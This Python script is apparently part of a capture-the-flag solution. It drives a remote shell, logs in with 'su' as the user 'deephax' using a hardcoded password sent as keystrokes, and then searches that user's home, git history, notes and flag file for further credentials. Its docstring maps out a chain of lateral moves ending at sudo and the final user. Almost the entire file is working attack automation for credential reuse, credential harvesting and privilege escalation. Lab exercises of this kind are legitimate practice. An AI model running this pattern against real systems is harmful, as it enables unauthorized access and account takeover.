"""Does sending the password as a keystroke (not a paste) make su work?

If yes, the whole chain opens: svc-deploy -> deephax -> git -> gh0st404 ->
collect.sh -> sunstalker -> sudo -> lilith.
"""
import asyncio
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    return "\n".join(l for l in buf.splitlines() if tag not in l).strip(), ok


async def body(sh):
    await sh.read(5.0)
    print("start:", (await cmd(sh, "id"))[0][:150], flush=True)

    print("\n### su - deephax (typing the password as a keystroke)", flush=True)
    await sh.send("su - deephax")
    got, buf = await wait_for(sh, "Password:", 25.0)
    print("password prompt seen:", got, "|", buf.strip()[-120:], flush=True)
    if not got:
        return False

    await sh.send("Sk4t3rB0y_S1nce_2011")
    await asyncio.sleep(3.0)
    await sh.read(3.0)

    who, _ = await cmd(sh, "id", 30)
    print("after su ->", who[:250], flush=True)
    if "deephax" not in who:
        print("[!] su did not take", flush=True)
        return False

    print("\n### deephax's home + git repo", flush=True)
    print(await cmd(sh, "ls -la ~ ; echo ---; ls -laR ~/kingmaker-scraper 2>/dev/null | head -30"), flush=True)
    print("\n### git history (gh0st404 creds?)", flush=True)
    print(await cmd(sh, "cd ~/kingmaker-scraper 2>/dev/null && git log --oneline --all 2>&1 | head -20"), flush=True)
    print("\n### notes", flush=True)
    print(await cmd(sh, "cat ~/kingmaker-scraper/*.txt 2>/dev/null; cat ~/notes.txt 2>/dev/null"), flush=True)
    print("\n### deephax flag", flush=True)
    print(await cmd(sh, "cat ~/flag.txt 2>/dev/null"), flush=True)
    return True


async def main():
    for attempt in range(1, 5):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                print(f"[outer {attempt}]", flush=True)
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}", flush=True)
        await asyncio.sleep(6)
    print("[!] done", flush=True)


asyncio.run(main())
